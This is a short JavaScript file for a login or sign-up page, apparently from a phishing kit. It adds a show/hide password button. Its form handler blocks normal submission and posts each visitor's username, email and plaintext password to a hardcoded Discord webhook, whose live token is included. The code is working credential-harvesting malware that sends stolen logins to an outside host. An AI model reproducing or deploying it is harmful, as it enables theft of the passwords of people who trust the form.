
document.getElementById('togglePassword').addEventListener('click', function(event) {

    event.preventDefault();


    const passwordInput = document.getElementById('password');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }

    this.textContent = (passwordInput.type === 'password') ? '👁️' : '🚫';
});

document.querySelector("form").addEventListener("submit", function(event) {
    event.preventDefault();  

    const username = document.getElementById('username').value;
    const email = document.getElementById('email').value || "None";
    const password = document.getElementById('password').value;

    if (username && password) {
        const webhookUrl = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
        const payload = {
            embeds: [
                {
                    title: 'New User',
                    fields: [
                        {
                            name: 'User',
                            value: username,
                            inline: true
                        },
                        {
                            name: 'Email',
                            value: email,
                            inline: true
                        },
                        {
                            name: 'Password',
                            value: password,
                            inline: true
                        }
                    ],
                    color: 7506394
                }
            ]
        };

        console.log('Sending to webhook with payload:', payload);

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => console.log('Message sent to Discord:', data))
        .catch(error => console.error('Error sending to Discord:', error));
    } else {
        console.error('Form data is incomplete');
    }
});
